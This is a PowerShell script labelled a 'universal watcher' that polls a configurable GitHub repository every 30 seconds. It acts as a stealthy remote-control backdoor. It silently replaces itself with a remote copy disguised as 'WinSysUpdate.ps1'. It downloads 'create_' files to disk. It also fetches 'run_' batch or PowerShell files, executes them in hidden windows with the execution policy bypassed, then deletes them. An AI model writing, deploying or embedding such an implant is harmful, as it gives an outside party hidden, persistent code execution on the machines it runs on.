# --- UNIVERSAL WATCHER (CORRECTED) ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"
$logFile = Join-Path $dir "debug_log.txt"

# Debug logging function
function Write-Log {
    param($msg)
    "$(Get-Date -Format 'HH:mm:ss'): $msg" | Out-File $logFile -Append
}

Write-Log "=== Watcher started ==="

if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main"
    Write-Log "Config loaded: User=$user, Repo=$repo"
    Write-Log "Base URL: $url"
} else { 
    Write-Log "ERROR: config.txt not found!"
    exit 
}

while($true) {
    try {
        Write-Log "--- Check cycle started ---"
        
        # 1. Self-Update
        try {
            $remoteUrl = "$url/WinSysUpdate.ps1"
            Write-Log "Self-update: Checking $remoteUrl"
            $remote = Invoke-WebRequest -Uri $remoteUrl -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
            $local = Get-Content $MyInvocation.MyCommand.Path -Raw
            
            if ($remote -and $remote -ne $local) {
                Write-Log "UPDATE: New version detected! Updating and restarting..."
                Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
                Write-Log "UPDATE: Restart initiated"
                exit
            } else {
                Write-Log "Self-update: No changes detected"
            }
        } catch {
            Write-Log "Self-update ERROR: $_"
        }

        # 2. Check GitHub API for commands
        $apiUrl = "https://api.github.com/repos/$user/$repo/contents/"
        Write-Log "API: Fetching file list from $apiUrl"
        
        try {
            $files = Invoke-RestMethod -Uri $apiUrl -UseBasicParsing
            Write-Log "API: Found $($files.Count) items in repository"
            
            foreach ($f in $files) {
                $n = $f.name
                $u = $f.download_url
                $t = $f.type
                
                # Skip directories
                if ($t -eq "dir") {
                    Write-Log "SKIP: $n (directory)"
                    continue
                }
                
                Write-Log "FILE: $n (type: $t, url: $u)"

                # CREATE command - stays on disk, syncs updates
                if ($n -like "create_*") {
                    try {
                        $cleanName = $n -replace "create_",""
                        $targetPath = Join-Path $dir $cleanName
                        Write-Log "CREATE: Processing $cleanName"
                        
                        $content = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                        
                        # Check if file needs update
                        $needsUpdate = $true
                        if (Test-Path $targetPath) {
                            $existingContent = Get-Content $targetPath -Raw
                            if ($existingContent -eq $content) {
                                $needsUpdate = $false
                                Write-Log "CREATE: $cleanName already up to date"
                            }
                        }
                        
                        if ($needsUpdate) {
                            Set-Content -Path $targetPath -Value $content
                            Write-Log "CREATE: SUCCESS - $cleanName saved to $targetPath"
                        }
                    } catch {
                        Write-Log "CREATE ERROR for $n : $_"
                    }
                }

                # RUN command - download, execute once, delete
                if ($n -like "run_*") {
                    try {
                        $p = Join-Path $dir $n
                        Write-Log "RUN: Processing $n"
                        Write-Log "RUN: Downloading from $u"
                        
                        Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
                        
                        if (Test-Path $p) {
                            $fileSize = (Get-Item $p).Length
                            Write-Log "RUN: Downloaded successfully ($fileSize bytes)"
                            
                            # Execute based on file type
                            if ($n -like "*.bat") { 
                                Write-Log "RUN: Executing as BAT file"
                                Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden
                            }
                            elseif ($n -like "*.ps1") { 
                                Write-Log "RUN: Executing as PowerShell script"
                                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden
                            }
                            else {
                                Write-Log "RUN: Unknown file type, skipping execution"
                            }

                            # Wait a bit then delete
                            Start-Sleep -Seconds 3
                            if (Test-Path $p) { 
                                Remove-Item -Path $p -Force -ErrorAction SilentlyContinue 
                                Write-Log "RUN: File cleaned up from disk"
                            }
                        } else {
                            Write-Log "RUN ERROR: File not found after download"
                        }
                    } catch {
                        Write-Log "RUN ERROR for $n : $_"
                    }
                }
            }
            
            Write-Log "Check cycle completed successfully"
            
        } catch {
            Write-Log "API ERROR: Failed to fetch file list - $_"
        }
        
    } catch { 
        Write-Log "MAIN LOOP ERROR: $_"
    }
    
    Write-Log "Sleeping for 30 seconds..."
    Start-Sleep -Seconds 30
}
